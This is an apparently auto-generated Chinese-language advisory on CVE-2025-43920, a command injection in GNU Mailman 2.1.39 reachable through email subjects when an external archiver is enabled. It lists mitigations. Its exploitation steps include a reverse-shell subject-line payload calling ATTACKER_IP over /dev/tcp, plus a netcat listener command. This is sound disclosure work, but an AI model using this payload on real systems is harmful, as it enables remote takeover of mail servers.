## CVE-2025-43920-GNU Mailman-命令注入

**漏洞编号:** CVE-2025-43920

**漏洞类型:** 命令注入

**影响应用:** GNU Mailman

**危害等级:** 中危，可能导致远程代码执行

**影响版本:** 2.1.39

**利用条件:** 需要目标Mailman列表配置了外部存档器（PUBLIC_EXTERNAL_ARCHIVER 或 PRIVATE_EXTERNAL_ARCHIVER）。攻击者需要能够向目标列表发送邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-43920是GNU Mailman 2.1.39版本中的一个命令注入漏洞。该漏洞源于在处理邮件主题时，未对特殊字符进行充分的过滤。如果Mailman配置了外部归档器（`PUBLIC_EXTERNAL_ARCHIVER`或`PRIVATE_EXTERNAL_ARCHIVER`），攻击者可以通过在邮件主题中插入shell元字符，例如`;`、`&`或`|`，来执行任意操作系统命令。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC是有效的。搜索引擎结果中也提到了该漏洞的存在以及github上的POC。

**投毒风险：**
该README.md文件本身不太可能包含任何投毒代码。其目的在于描述漏洞和提供利用方法。虽然存在远程执行代码的风险，但这不是传统的“投毒”。投毒风险评估较低，大约5%，主要是因为可能存在一些未知的后门或者恶意脚本，但概率较小。

**利用方式：**
1.  **确定目标：** 找到运行GNU Mailman 2.1.39并且配置了外部存档器的系统。
2.  **发送恶意邮件：** 构造一封包含恶意主题的邮件。例如，`Subject: ;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`。将`ATTACKER_IP`替换为攻击者的IP地址和端口。
3.  **监听连接：** 在攻击者的服务器上设置一个监听器（例如，使用netcat：`nc -lvnp 4444`）。
4.  **执行命令：** 当Mailman处理包含恶意主题的邮件时，外部存档器将执行注入的命令，从而在攻击者的服务器上建立一个反向shell。

**缓解措施（POC中也提到了）：**
*   禁用外部存档器：将`PUBLIC_EXTERNAL_ARCHIVER`和`PRIVATE_EXTERNAL_ARCHIVER`设置为`None`。
*   升级到Mailman 3.x：Mailman 3.x修复了此漏洞并提供了更好的输入验证。
*   限制订阅：限制邮件列表的订阅者为可信用户，以减少攻击面。

**项目地址:** [0NYX-MY7H/CVE-2025-43920](https://github.com/0NYX-MY7H/CVE-2025-43920)

**漏洞详情:** [CVE-2025-43920](https://nvd.nist.gov/vuln/detail/CVE-2025-43920)